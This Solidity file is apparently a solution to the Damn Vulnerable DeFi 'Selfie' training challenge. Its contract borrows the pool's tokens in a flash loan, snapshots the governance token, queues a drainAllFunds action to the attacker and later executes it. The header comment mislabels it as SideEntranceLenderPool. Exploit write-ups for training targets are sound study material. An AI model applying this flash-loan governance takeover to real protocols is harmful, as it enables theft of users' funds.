// SPDX-License-Identifier: MIT
pragma solidity 0.8.17;

import {Address} from "openzeppelin-contracts/utils/Address.sol";
import {SelfiePool, ERC20Snapshot} from "./SelfiePool.sol";
import {SimpleGovernance} from "./SimpleGovernance.sol";

import "forge-std/console.sol";

/**
 * @title SideEntranceLenderPool
 * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
 */

contract Attack {
    SelfiePool selfiePool;
    SimpleGovernance simpleGovernance;
    ERC20Snapshot token;
    address owner;
    uint256 public actionId;

    constructor(address selfiePoolAddress, address simpleGovernanceAddress) {
        selfiePool = SelfiePool(selfiePoolAddress);
        simpleGovernance = SimpleGovernance(simpleGovernanceAddress);
        token = ERC20Snapshot(selfiePool.token());
    }

    function execute() external payable {
        owner = msg.sender;
        uint256 poolBalance = token.balanceOf(address(selfiePool));
        selfiePool.flashLoan(poolBalance);
        console.log("First part executed", poolBalance);
    }

    function receiveTokens(address _address, uint256 _amount) public payable {
        bytes memory action = abi.encodeWithSignature("drainAllFunds(address)", address(owner));
        address(token).call(abi.encodeWithSignature("snapshot()"));
        actionId = simpleGovernance.queueAction(address(selfiePool), action, 0 ether);
        //payback the flashloan*/
        token.transfer(address(selfiePool), _amount);
        console.log("Proposal Inserted", _amount);
    }

    function finish() external {
        simpleGovernance.executeAction(actionId);
        console.log("Proposal Executed");
    }

    receive() external payable {}
}
